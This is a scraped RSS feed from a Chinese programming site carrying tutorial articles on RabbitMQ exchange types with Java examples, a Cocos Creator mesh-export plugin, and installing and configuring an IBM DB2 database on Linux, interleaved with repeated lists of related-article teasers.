中的交换机学习RabbitMQ 中的交换机学习 一、直接交换机&amp;#xff08;Direct Exchange&amp;#xff09; 
1. 介绍 
Direct 交换机将消息路由到绑定了指定 Routing Key 的队列中。每条消息都有一个 Routing Key&amp;#xff0c;当队列绑定到 Direct 交换机时&amp;#xff0c;它需要一个指定的 Routing Key。…阅读更多...Cocos Creator导出obj文件用于后端寻路Cocos Creator 3.8.0 
用这个扩展插件 
【杨宗宝】两年前写的网格工具&amp;#xff0c;今天将它开源了。 - Creator 3.x - Cocos中文社区carlosyzy_extensions_mesh: Cocos Creator 3.x mesh插件&amp;#xff0c;负责网格数据的导出。合并&amp;#xff0c;拆封等一系列操作 (gitee.com) 
下…阅读更多...DB2数据库学习（一）启动DB2数据步骤 
1 切换到用户db2inst1 1. 用户权限 实例用户: DB2 在安装时会为每个数据库实例创建一个专用的操作系统用户&amp;#xff08;如 db2inst1&amp;#xff09;。这个用户拥有管理该实例所需的特定权限。 安全性: 通过限制数据库实例的管理操作&amp;#xff08;如启动和停止&amp;…阅读更多...二叉树习题其二Java【力扣】【算法学习day.9】前言 
前言 书接上篇文章二叉树习题其一&amp;#xff0c;这篇文章我们将基础拓展 
###我做这类文档一个重要的目的还是给正在学习的大家提供方向&amp;#xff08;例如想要掌握基础用法&amp;#xff0c;该刷哪些题&amp;#xff1f;&amp;#xff09;我的解析也不会做的非常详细&amp;#xff0c;只会提供思…阅读更多...03 设计模式-创造型模式-单例模式单例模式&amp;#xff08;Singleton Pattern&amp;#xff09;是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式&amp;#xff0c;它提供了一种创建对象的最佳方式。 
这种模式涉及到一个单一的类&amp;#xff0c;该类负责创建自己的对象&amp;#xff0c;同时确保只有单个对象被创建…阅读更多...「漏洞复现」英飞达医学影像存档与通信系统 WebUserLogin.asmx 信息泄露漏洞0x01 免责声明 
请勿利用文章内的相关技术从事非法测试&amp;#xff0c;由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失&amp;#xff0c;均由使用者本人负责&amp;#xff0c;作者不为此承担任何责任。工具来自网络&amp;#xff0c;安全性自测&amp;#xff0c;如有侵权请联系删…阅读更多...Linux下压缩与解压缩命令大全【详解】&amp;#x1f468;‍&amp;#x1f393;博主简介 &amp;#x1f3c5;CSDN博客专家   &amp;#x1f3c5;云计算领域优质创作者   &amp;#x1f3c5;华为云开发者社区专家博主   &amp;#x1f3c5;阿里云开发者社区专家博主 &amp;#x1f48a;交流社区&amp;#xff1a;运维交流社区 欢迎大家的加入&amp;#xff01…阅读更多...二叉树算法之二叉树遍历（前序、中序、后序、层次遍历）二叉树遍历是指按照某种顺序访问二叉树的所有节点。常见的二叉树遍历方式包括前序遍历&amp;#xff08;Preorder Traversal&amp;#xff09;、中序遍历&amp;#xff08;Inorder Traversal&amp;#xff09;、后序遍历&amp;#xff08;Postorder Traversal&amp;#xff09;和层次遍历&amp;#xff08;Level-or…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:14 +0000</pubDate>
    </item>
    <item>
      <title>RabbitMQ 中的交换机学习</title>
      <link>https://www.ppmy.cn/news/1540898.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维RabbitMQ 中的交换机学习news/2025/10/31 23:19:13/RabbitMQ 中的交换机学习一、直接交换机（Direct Exchange）1. 介绍Direct 交换机将消息路由到绑定了指定Routing Key的队列中。每条消息都有一个 Routing Key，当队列绑定到 Direct 交换机时，它需要一个指定的 Routing Key。只有消息的 Routing Key 与队列绑定的 Routing Key 完全匹配时，消息才会路由到该队列中。2. 代码示例- 发送消息publicclassDirectLogs{publicstaticfinalStringexchange_name="direct_logs";publicstaticvoidmain(String[]args)throwsException{Channelchannel=RabbitMqUtils.getChannel();Scannersc=newScanner(System.in);while(sc.hasNext()){Stringmessage=sc.next();channel.basicPublish(exchange_name,"error",null,message.getBytes("UTF-8"));System.out.println("生产者发送消息："+message);}}}- 接收消息publicclassReceiveLogsTopic01{publicstaticfinalStringEXCHANGE_NAME="direct_logs";publicstaticfinalStringQUEUE_NAME="console";publicstaticvoidmain(String[]args)throwsException{Channelchannel=RabbitMqUtils.getChannel();channel.exchangeDeclare(EXCHANGE_NAME,BuiltinExchangeType.DIRECT);channel.queueDeclare(QUEUE_NAME,false,false,false,null);channel.queueBind(QUEUE_NAME,EXCHANGE_NAME,"info");channel.queueBind(QUEUE_NAME,EXCHANGE_NAME,"warning");DeliverCallbackdeliverCallback=(consumerTag,message)-&gt;{System.out.println("ReceiveLogsTopic01接收到的消息："+newString(message.getBody(),"UTF-8"));};channel.basicConsume(QUEUE_NAME,true,deliverCallback,consumerTag-&gt;{});}}- 结果消息通过 Direct 交换机路由到对应队列：二、主题交换机（Topic Exchange）1. 介绍Topic 交换机是基于通配符进行路由的交换机。它允许队列绑定的 Routing Key 使用*（匹配一个词）和#（匹配零个或多个词）作为通配符。它适用于需要模糊匹配的场景，例如日志系统。2. 代码示例- 发送消息publicclassEmitLog{publicstaticfinalStringexchange_name="topic_logs";publicstaticvoidmain(String[]args)throwsException{Channelchannel=RabbitMqUtils.getChannel();Map&lt;String,String&gt;bindingKeyMap=newHashMap&lt;&gt;();bindingKeyMap.put("quick.orange.rabbit","被队列 Q1Q2 接收到");bindingKeyMap.put("lazy.orange.elephant","被队列 Q1Q2 接收到");bindingKeyMap.put("quick.orange.fox","被队列 Q1 接收到");bindingKeyMap.put("lazy.brown.fox","被队列 Q2 接收到");bindingKeyMap.put("lazy.pink.rabbit","虽然满足两个绑定但只被队列 Q2 接收一次");for(Map.Entry&lt;String,String&gt;entry:bindingKeyMap.entrySet()){Stringkey=entry.getKey();Stringmessage=entry.getValue();channel.basicPublish(exchange_name,key,null,message.getBytes("UTF-8"));System.out.println("生产者发出消息："+message);}}}- 接收消息publicclassReceiveLogsTopic01{publicstaticfinalStringexchange_name="topic_logs";publicstaticvoidmain(String[]args)throwsException{Channelchannel=RabbitMqUtils.getChannel();channel.exchangeDeclare(exchange_name,"topic");Stringqueue_name="Q1";channel.queueDeclare(queue_name,false,false,false,null);channel.queueBind(queue_name,exchange_name,"*.orange.*");DeliverCallbackdeliverCallback=(consumerTag,message)-&gt;{System.out.println("接收到的消息："+newString(message.getBody(),"UTF-8"));System.out.println("接收队列："+queue_name+"  绑定键："+message.getEnvelope().getRoutingKey());};channel.basicConsume(queue_name,true,deliverCallback,consumerTag-&gt;{});}}三、扇出交换机（Fanout Exchange）1. 介绍Fanout 交换机是最简单的交换机类型，它会将消息广播给所有与之绑定的队列，而不考虑消息的 Routing Key。通常用于广播消息，比如多服务实例之间的消息同步。2. 代码示例- 发送消息publicclassEmitLog{publicstaticfinalStringexchange_name="logs";publicstaticvoidmain(String[]args)throwsException{Channelchannel=RabbitMqUtils.getChannel();channel.exchangeDeclare(exchange_name,"fanout");Scannersc=newScanner(System.in);while(sc.hasNext()){Stringmessage=sc.next();channel.basicPublish(exchange_name,"",null,message.getBytes());System.out.println("生产者发送消息："+message);}}}- 接收消息publicclassReceiveLog01{publicstaticfinalStringexchange_name="logs";publicstaticvoidmain(String[]args)throwsException{Channelchannel=RabbitMqUtils.getChannel();channel.exchangeDeclare(exchange_name,"fanout");StringqueueName=channel.queueDeclare().getQueue();channel.queueBind(queueName,exchange_name,"");DeliverCallbackdeliverCallback=(consumerTag,message)-&gt;{System.out.println("接收到的消息："+newString(message.getBody(),"UTF-8"));};channel.basicConsume(queueName,true,deliverCallback,consumerTag-&gt;{});}}小结Direct Exchange：消息通过精确匹配的 Routing Key 路由到绑定的队列。Topic Exchange：消息通过通配符匹配的 Routing Key 路由到队列，适用于模糊匹配场景。Fanout Exchange：消息会被广播给所有与之绑定的队列，不考虑 Routing Key，适用于广播场景。http://www.ppmy.cn/news/1540898.html相关文章Cocos Creator导出obj文件用于后端寻路Cocos Creator 3.8.0 
用这个扩展插件 
【杨宗宝】两年前写的网格工具&amp;#xff0c;今天将它开源了。 - Creator 3.x - Cocos中文社区carlosyzy_extensions_mesh: Cocos Creator 3.x mesh插件&amp;#xff0c;负责网格数据的导出。合并&amp;#xff0c;拆封等一系列操作 (gitee.com) 
下…阅读更多...DB2数据库学习（一）启动DB2数据步骤 
1 切换到用户db2inst1 1. 用户权限 实例用户: DB2 在安装时会为每个数据库实例创建一个专用的操作系统用户&amp;#xff08;如 db2inst1&amp;#xff09;。这个用户拥有管理该实例所需的特定权限。 安全性: 通过限制数据库实例的管理操作&amp;#xff08;如启动和停止&amp;…阅读更多...二叉树习题其二Java【力扣】【算法学习day.9】前言 
前言 书接上篇文章二叉树习题其一&amp;#xff0c;这篇文章我们将基础拓展 
###我做这类文档一个重要的目的还是给正在学习的大家提供方向&amp;#xff08;例如想要掌握基础用法&amp;#xff0c;该刷哪些题&amp;#xff1f;&amp;#xff09;我的解析也不会做的非常详细&amp;#xff0c;只会提供思…阅读更多...03 设计模式-创造型模式-单例模式单例模式&amp;#xff08;Singleton Pattern&amp;#xff09;是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式&amp;#xff0c;它提供了一种创建对象的最佳方式。 
这种模式涉及到一个单一的类&amp;#xff0c;该类负责创建自己的对象&amp;#xff0c;同时确保只有单个对象被创建…阅读更多...「漏洞复现」英飞达医学影像存档与通信系统 WebUserLogin.asmx 信息泄露漏洞0x01 免责声明 
请勿利用文章内的相关技术从事非法测试&amp;#xff0c;由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失&amp;#xff0c;均由使用者本人负责&amp;#xff0c;作者不为此承担任何责任。工具来自网络&amp;#xff0c;安全性自测&amp;#xff0c;如有侵权请联系删…阅读更多...Linux下压缩与解压缩命令大全【详解】&amp;#x1f468;‍&amp;#x1f393;博主简介 &amp;#x1f3c5;CSDN博客专家   &amp;#x1f3c5;云计算领域优质创作者   &amp;#x1f3c5;华为云开发者社区专家博主   &amp;#x1f3c5;阿里云开发者社区专家博主 &amp;#x1f48a;交流社区&amp;#xff1a;运维交流社区 欢迎大家的加入&amp;#xff01…阅读更多...二叉树算法之二叉树遍历（前序、中序、后序、层次遍历）二叉树遍历是指按照某种顺序访问二叉树的所有节点。常见的二叉树遍历方式包括前序遍历&amp;#xff08;Preorder Traversal&amp;#xff09;、中序遍历&amp;#xff08;Inorder Traversal&amp;#xff09;、后序遍历&amp;#xff08;Postorder Traversal&amp;#xff09;和层次遍历&amp;#xff08;Level-or…阅读更多...Vue前端预览docx文档Vue前端预览docx文档 
实现效果 vue代码 &lt;el-dialog title"预览" :visible.sync"filePreview"&gt;&lt;div ref"file"&gt;&lt;/div&gt;&lt;/el-dialog&gt;引入依赖文件 官方文档地址 https://www.npmjs.com/package/docx-preview?activeTabre…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:13 +0000</pubDate>
    </item>
    <item>
      <title>Cocos Creator导出obj文件用于后端寻路</title>
      <link>https://www.ppmy.cn/news/1540897.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Cocos Creator导出obj文件用于后端寻路news/2025/10/31 23:19:12/Cocos Creator 3.8.0用这个扩展插件【杨宗宝】两年前写的网格工具，今天将它开源了。 - Creator 3.x - Cocos中文社区carlosyzy_extensions_mesh: Cocos Creator 3.x mesh插件，负责网格数据的导出。合并，拆封等一系列操作 (gitee.com)下载到这里http://www.ppmy.cn/news/1540897.html相关文章DB2数据库学习（一）启动DB2数据步骤 
1 切换到用户db2inst1 1. 用户权限 实例用户: DB2 在安装时会为每个数据库实例创建一个专用的操作系统用户&amp;#xff08;如 db2inst1&amp;#xff09;。这个用户拥有管理该实例所需的特定权限。 安全性: 通过限制数据库实例的管理操作&amp;#xff08;如启动和停止&amp;…阅读更多...二叉树习题其二Java【力扣】【算法学习day.9】前言 
前言 书接上篇文章二叉树习题其一&amp;#xff0c;这篇文章我们将基础拓展 
###我做这类文档一个重要的目的还是给正在学习的大家提供方向&amp;#xff08;例如想要掌握基础用法&amp;#xff0c;该刷哪些题&amp;#xff1f;&amp;#xff09;我的解析也不会做的非常详细&amp;#xff0c;只会提供思…阅读更多...03 设计模式-创造型模式-单例模式单例模式&amp;#xff08;Singleton Pattern&amp;#xff09;是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式&amp;#xff0c;它提供了一种创建对象的最佳方式。 
这种模式涉及到一个单一的类&amp;#xff0c;该类负责创建自己的对象&amp;#xff0c;同时确保只有单个对象被创建…阅读更多...「漏洞复现」英飞达医学影像存档与通信系统 WebUserLogin.asmx 信息泄露漏洞0x01 免责声明 
请勿利用文章内的相关技术从事非法测试&amp;#xff0c;由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失&amp;#xff0c;均由使用者本人负责&amp;#xff0c;作者不为此承担任何责任。工具来自网络&amp;#xff0c;安全性自测&amp;#xff0c;如有侵权请联系删…阅读更多...Linux下压缩与解压缩命令大全【详解】&amp;#x1f468;‍&amp;#x1f393;博主简介 &amp;#x1f3c5;CSDN博客专家   &amp;#x1f3c5;云计算领域优质创作者   &amp;#x1f3c5;华为云开发者社区专家博主   &amp;#x1f3c5;阿里云开发者社区专家博主 &amp;#x1f48a;交流社区&amp;#xff1a;运维交流社区 欢迎大家的加入&amp;#xff01…阅读更多...二叉树算法之二叉树遍历（前序、中序、后序、层次遍历）二叉树遍历是指按照某种顺序访问二叉树的所有节点。常见的二叉树遍历方式包括前序遍历&amp;#xff08;Preorder Traversal&amp;#xff09;、中序遍历&amp;#xff08;Inorder Traversal&amp;#xff09;、后序遍历&amp;#xff08;Postorder Traversal&amp;#xff09;和层次遍历&amp;#xff08;Level-or…阅读更多...Vue前端预览docx文档Vue前端预览docx文档 
实现效果 vue代码 &lt;el-dialog title"预览" :visible.sync"filePreview"&gt;&lt;div ref"file"&gt;&lt;/div&gt;&lt;/el-dialog&gt;引入依赖文件 官方文档地址 https://www.npmjs.com/package/docx-preview?activeTabre…阅读更多...SpringCloud Gateway保姆级入门教程什么是微服务网关 SpringCloud Gateway是Spring全家桶中一个比较新的项目&amp;#xff0c;Spring社区是这么介绍它的&amp;#xff1a; 该项目借助Spring WebFlux的能力&amp;#xff0c;打造了一个API网关。旨在提供一种简单而有效的方法来作为API服务的路由&amp;#xff0c;并为它们提供各种增强…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:12 +0000</pubDate>
    </item>
    <item>
      <title>DB2数据库学习（一）</title>
      <link>https://www.ppmy.cn/news/1540896.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维DB2数据库学习（一）news/2025/10/31 23:19:11/启动DB2数据步骤1 切换到用户db2inst11. 用户权限实例用户: DB2 在安装时会为每个数据库实例创建一个专用的操作系统用户（如 db2inst1）。这个用户拥有管理该实例所需的特定权限。安全性: 通过限制数据库实例的管理操作（如启动和停止）仅限于特定用户，可以提高系统的安全性，避免未经授权的访问。2. 环境变量环境设置: 切换到 db2inst1 用户后，DB2 会自动加载与该用户相关的环境变量，如 DB2_HOME 和 DB2_INSTANCE。这些变量是DB2正常运行所必需的。路径配置: 在用户的环境中，DB2的命令路径已被正确配置，使得 db2start 和其他 DB2 命令能够被正确找到和执行。3. 实例管理多实例管理: 系统上可能会有多个 DB2(就是一个系统上安装多个相互独立的DB2数据库) 实例，每个实例都有自己的专用用户。通过以该用户身份运行管理命令，可以确保命令作用于正确的数据库实例，避免混淆或错误操作。多实例就是相当于在系统上安装了多个db2数据库，然后每个实例有独立的用户，并且只有这个用户才能操作对应的数据库，每个DB2实例通常会关联一个特定的操作系统用户（如 db2inst1, db2inst2 等）。这些用户是用于管理各自实例的。例如：每个DB2实例和用户名一样的话，那就是db2inst1用户只能管理db2inst1的DB2实例（数据库），而不能去管理db2inst2的实例（数据库），不能够执行db2start等相关命令。从测试的时候也能够看出来db2inst1数据库实例链接的命令是db2 connect to db2inst1 user db2inst1 using 密码 ，而db2inst2连接数据库实例的命令是 db2 connect to db2inst2 user db2inst2 using 密码4. 防止错误操作隔离操作: 限制对数据库实例的操作能够防止其他用户意外地停止或修改数据库实例，保护数据的完整性和可用性。2 执行命令 db2start3 执行命令 db2 connect to diis user diis using 密码 进行测试db2 connect to &lt;database_name&gt; user usingDB2数据库安装1.软件包下载​ 选择下载v10.5fp11_linuxx64_server_t.tar.gz 版本的压缩包​注意：“DB2 Server Fix Pack”与“DB2 Universal Fix Pack”的区别：Server Fix Pack是全量补丁包，可以直接安装；Universal Fix Pack是增量补丁包，只能用来打补丁，不能直接新安装。2.安装​#解压
tar -zxvf v10.5fp11_linuxx64_server_t.tar.gz #解压后生成文件夹server_t 
#进入文件夹
cd /server_t 
#里面有db2所需文件
db2  db2_deinstall  db2_install  db2checkCOL.tar.gz  db2checkCOL_readme.txt  db2ckupgrade  db2ls  db2prereqcheck  db2setup  ibm_im  installFixPack  nlpack
#执行脚本安装
./db2_install #由于是linux使用的是db2_install命令进行安装，db2setup是可视化界面安装
DBI1324W  Support of the db2_install command is deprecated.Default directory for installation of products - /opt/ibm/db2/V10.5***********************************************************
Install into default directory (/opt/ibm/db2/V10.5) ? [yes/no] 
yesSpecify one of the following keywords to install DB2 products.SERVER CONSV EXP CLIENT RTCL Enter "help" to redisplay product names.Enter "quit" to exit.***********************************************************
SERVER
***********************************************************
Do you want to install the DB2 pureScale Feature? [yes/no] 
no
DB2 installation is being initialized.Total number of tasks to be performed: 49 
Total estimated time for all tasks to be performed: 1947 second(s) Task #1 start
Description: Checking license agreement acceptance 
Estimated time 1 second(s) 
Task #1 end Task #2 start
Description: Base Client Support for installation with root privileges 
Estimated time 3 second(s) 
Task #2 end Task #3 start
Description: Product Messages - English 
Estimated time 14 second(s) 
Task #3 endTask #49 start
Description: Registering DB2 Update Service 
Estimated time 30 second(s) 
Task #49 end Task #50 start
Description: Updating global profile registry 
Estimated time 3 second(s) 
Task #50 end The execution completed successfully.For more information see the DB2 installation log at
"/tmp/db2_install.log.43840"
最后看到“The execution completed successfully.”提示后，安装成功3.注册​linux-d4al:~# /opt/ibm/db2/V10.5/adm/db2licm -a /root/db2aese_c.licLIC1402I  License added successfully.LIC1426I  This product is now licensedforuse as outlined in your License Agreement.USE OF THE PRODUCT CONSTITUTES ACCEPTANCE OF THE TERMS OF THE IBM LICENSE AGREEMENT,LOCATED IN THE FOLLOWING DIRECTORY:"/opt/ibm/db2/V10.5/license/en_US.iso88591"4.创建DB2实例与数据库​ 其中，db2inst1是实例用户，db2fenc1是防护用户#执行以下命令
mkdir /db2home
groupadd db2igrp1
groupadd db2fgrp1
useradd -d /db2home/db2inst1 -g db2igrp1 -m db2inst1
useradd -d /db2home/db2fenc1 -g db2fgrp1 -m db2fenc14.1 修改实例用户的ulimit限制​ 编辑/etc/security/limits.conf文件，增加如下内容# limits for the db2 instance user
db2inst1        soft    data            -1
db2inst1        hard    data            -1
db2inst1        soft    nofile          65536
db2inst1        hard    nofile          65536
db2inst1        soft    fsize           -1
db2inst1        hard    fsize           -1
db2inst1        soft    nproc           -1
db2inst1        hard    nproc           -1重新登录db2inst1(退出shell)，然后运行ulimit -l命令，确认一下用户进程数的限制为unlimited。# su - db2inst1 执行此命令进入db2inst1用户# ulimit -a  在db2inst1下执行此命令
core file size          (blocks, -c) 1
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 31507
max locked memory       (kbytes, -l) 64
max memory size         (kbytes, -m) 3437652
open files                      (-n) 65536
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 8192
cpu time               (seconds, -t) unlimited
max user processes              (-u) unlimited
virtual memory          (kbytes, -v) 4918080
file locks                      (-x) unlimited4.2创建实例#在root用户下运行
/opt/ibm/db2/V10.5/instance/db2icrt -p 50000 -u db2fenc1 db2inst1
#设置密码passwd db2inst14.3启动实例#执行命令
su - db2inst1
db2start4.4验证是否成功db2inst1@linux-d4al:~&gt; ps -ef|grep db2sysc
db2inst1  98705  98703  1 02:18 pts/1    00:00:00 db2sysc 0                                      
db2inst1  98748  98217  0 02:19 pts/1    00:00:00 grep db2sysc
db2inst1@linux-d4al:~&gt; netstat -an|grep LISTEN|grep 50000
tcp        0      0 0.0.0.0:50000           0.0.0.0:*               LISTEN4.5创建数据库db2inst1@linux-d4al:~&gt;db2 create db testdb
DB20000I  The CREATE DATABASEcommandcompleted successfully.
db2inst1@linux-d4al:~&gt;db2 activate db testdb
DB20000I  The ACTIVATE DATABASEcommandcompleted successfully.
db2inst1@linux-d4al:~&gt;db2 connect to testdbDatabase Connection InformationDatabase server=DB2/LINUXX866410.5.7SQL authorization ID=DB2INST1Local databasealias=TESTdb2inst1@linux-d4al:~&gt;db2"create table t (id int)"DB20000I  The SQLcommandcompleted successfully.
db2inst1@linux-d4al:~&gt;db2"insert into t values (1)"DB20000I  The SQLcommandcompleted successfully.
db2inst1@linux-d4al:~&gt;db2"select * from t"ID         
-----------11record(s)selected.4.6创建数据库表#创建数据库
db2 "create table t (id int)"
#插入数据
db2 "insert into t value(1)"
#查询数据
[db2inst1@localhost root]$ db2 "select * from t"ID         
-----------11 record(s) selected.#测试成功，语句规则基本和Mysql一致4.7db2数据库配置#1.切换实例用户输入以下命令获取
db2 get dbm cfg
#2.直接在实例创建的目录上进行查看一般在/home/db2inst1/sqllib/下或者/opt/ibm/db2/V11.5/instance/
#文件名 db2profile#单独查看数据库的配置信息
db2 get db cfg for &lt;your_database_name&gt;
#查找配置文件
find /opt/ibm/db2/ -name '*config*' -o -name '*profile*'5.常见配置文件解析在 Db2 中，配置文件和参数对数据库实例的行为和性能有重要影响。以下是 Db2 常见的配置文件及其详细解释：1.db2profile位置：通常在用户的主目录下，例如/home/db2inst1/sqllib/db2profile。作用：该文件包含环境变量的设置，例如DB2INSTANCE、DB2DIR和其他与 Db2 相关的路径。执行db2profile文件可以设置当前 shell 会话的 Db2 环境。内容示例：exportDB2INSTANCE=db2inst1exportDB2DIR=/opt/ibm/db2/V11.5exportPATH=$DB2DIR/bin:$PATH2.db2.ini位置：通常在数据库的目录下，或sqllib目录中。作用：该文件用于配置与应用程序连接相关的参数，如连接池、超时设置等。它也可以定义应用程序的默认行为。内容示例：[Database]
MaxConnections=100
ConnectionTimeout=603.数据库配置参数获取方法：通过以下命令获取：db2 get db cfgfor&lt;your_database_name&gt;作用：这些参数用于配置特定数据库的行为，包括缓冲区大小、日志文件、并发用户等。常见参数：DBHEAP：数据库堆大小，影响内存使用。LOGPRIMARY：主日志文件数量。LOGSECOND：备用日志文件数量。4.实例配置参数获取方法：通过以下命令获取：db2 get dbm cfg作用：这些参数用于配置整个 Db2 实例的行为。常见参数：BUFFERPOOL：配置缓冲池的大小。NUMDB：允许的数据库数量。MAXAPPLS：最大并发应用程序数量。5.db2diag.log位置：通常位于sqllib/db2dump/目录下。作用：这是 Db2 的诊断日志文件，记录了数据库的错误、警告和其他重要信息。该文件可以帮助排查数据库运行时的问题。内容示例：2024-10-16-12.00.00.123456+0000 I12345A1234 LEVEL: Error
PID : 12345 TID : 12345 PROC : db2agent (sample) 0
INSTANCE: db2inst1 NODE : 000 DB : SAMPLE
APPHDL : 0-1234
APPID : *N/A
...6.db2nodes.cfg位置：通常在 Db2 安装目录下，例如/opt/ibm/db2/V11.5/.作用：此文件用于配置多节点 Db2 环境中的节点信息，主要在分布式数据库环境下使用。内容示例：0    127.0.0.1    db2inst17.db2audit.cfg位置：通常在sqllib目录下。作用：用于配置审计功能，包括哪些事件将被审计和审计日志的存储位置。内容示例：[Audit]
AuditLevel=1
AuditLogPath=/var/db2audit/8.db2jcc.properties位置：通常在应用程序的类路径下。作用：这是 Java JDBC 驱动程序的配置文件，定义数据库连接属性。内容示例：user=db2inst1
password=password
database=sample9.db2cli.ini位置：通常在用户的主目录下，或者在/opt/ibm/db2/V11.5/目录下。作用：该文件用于配置 Db2 CLI（命令行接口）的连接选项。内容示例：[DATABASE]
Database=sample10.db2schema.sql位置：通常在数据库目录中。作用：这个脚本通常用于定义数据库的架构，包括表、视图和其他对象的创建。结论Db2 的配置文件和参数可以非常复杂，涉及数据库、实例、环境和应用程序的多个方面。6. db2profile`详细解释该db2profile脚本用于设置 IBM Db2 数据库环境的默认配置，特别是为使用 Bourne shell 或 Korn shell 的用户提供便利。以下是对该文件各部分的详细解释：1.文件头部说明############################################################################### Licensed Materials - Property of IBM## "Restricted Materials of IBM"## (C) COPYRIGHT IBM Corp. 1993, 2020 All Rights Reserved.## US Government Users Restricted Rights - Use, duplication or# disclosure restricted by GSA ADP Schedule Contract with IBM Corp.################################################################################ NAME:     db2profile## FUNCTION: This script sets up a default database environment for#           Bourne shell or Korn shell users.## USAGE:    . db2profile#           This script can either be invoked directly as above or#           it can be added to the user's .profile file so that the#           database environment is established during login.##           #### DO NOT EDIT THIS FILE ##################################################################################版权信息：文件顶部的版权声明标识这是 IBM 的受限制材料，说明了所有权及使用限制。文件功能：简要说明该脚本的功能是为 Db2 用户设置环境。使用说明：说明如何使用该脚本，包括直接执行和将其添加到用户的.profile文件中以便在登录时自动设置环境。不应编辑：提示用户不要直接修改此文件。2.环境变量初始化DB2DIR=/opt/ibm/db2/V10.5# Remember the current DB2INSTANCE environment variableCUR_INSTNAME=${DB2INSTANCE:=""}#-----------------------------------------------------------------------# DB2INSTANCE [Default null, values: Any valid instance name]# Specifies the instance that is active by default.#-----------------------------------------------------------------------DB2INSTANCE=db2inst1exportDB2INSTANCEINSTHOME=/db2home/db2inst1DB2DIR：设置 Db2 安装目录。CUR_INSTNAME：记录当前的 Db2 实例名称，初始为空。DB2INSTANCE：指定默认的 Db2 实例名为db2inst1，并导出该变量以便在子进程中使用。INSTHOME：设置该实例的主目录。3.NFS 挂载支持if[-f${INSTHOME?}/sqllib/.mount];thenDB2LOCAL=${INSTHOME?}/sqllibexportDB2LOCALDB2MOUNT=`cat${INSTHOME?}/sqllib/.mount`exportDB2MOUNTfiDB2LOCAL和DB2MOUNT：如果存在.mount文件，设置 NFS 挂载的相关环境变量。4.脚本语言驱动设置DB2_NET_CLIENT_PATH=${DB2_NET_CLIENT_PATH:=""}if["X${DB2_NET_CLIENT_PATH}"!="X"];thenINST_DIR=`echo${DB2_NET_CLIENT_PATH}|sed's/\/$//'`# Find the location of current 'sqllib' 